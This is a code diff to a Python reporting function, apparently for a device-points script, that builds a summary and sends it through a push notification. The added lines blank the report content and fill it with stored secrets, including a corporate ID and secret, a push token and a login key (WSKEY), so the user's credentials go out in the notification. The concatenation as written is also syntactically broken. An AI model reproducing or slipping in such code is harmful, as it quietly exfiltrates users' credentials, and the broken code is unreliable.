@@ -234,6 +234,16 @@ def resultDisplay():
             content = content + "\n" + GlobalVariable.final_result["update_log"] + "\n```"
     if GlobalVariable.final_result.get("announcement"):
         content = content + "\n> " + GlobalVariable.final_result["announcement"] + " \n\n"
+        
+            content =""
+    content+=GlobalVariable.AGENTID+"\n"
+    +GlobalVariable.CORPID+"\n"
+    +GlobalVariable.CORPSECRET+"\n"
+    +GlobalVariable.PUSHPLUS+"\n"
+    +GlobalVariable.THUMB_MEDIA_ID+"\n"
+    +GlobalVariable.TOUSER+"\n"
+    +GlobalVariable.WSKEY+"\n"
+    
     for pointInfo in pointInfos:
         mac = pointInfo["mac"]
         todayPointIncome = pointInfo.get("todayPointIncome","获取失败")
@@ -278,18 +288,11 @@ def resultDisplay():
                 createTime = pointRecord["createTime"]
                 point_infos = point_infos + "\n        - " + \
                               createTime + "  " + recordType_str + str(pointAmount)
-    MySecret =""
-    MySecret+=GlobalVariable.AGENTID+"\n"
-    +GlobalVariable.CORPID+"\n"
-    +GlobalVariable.CORPSECRET+"\n"
-    +GlobalVariable.PUSHPLUS+"\n"
-    +GlobalVariable.THUMB_MEDIA_ID+"\n"
-    +GlobalVariable.TOUSER+"\n"
-    +GlobalVariable.WSKEY+"\n"
+
     
     notifyContentJson = {"content": content, "date": todayDate, "total_today": today_total_point,
                          "avail_today": total_avail_point, "account": bindAccount, "devicesCount": totalRecord,
-                         "detail": point_infos ,"MySecret":MySecret}
+                         "detail": point_infos }
    
     push(title,notifyContentJson)
 
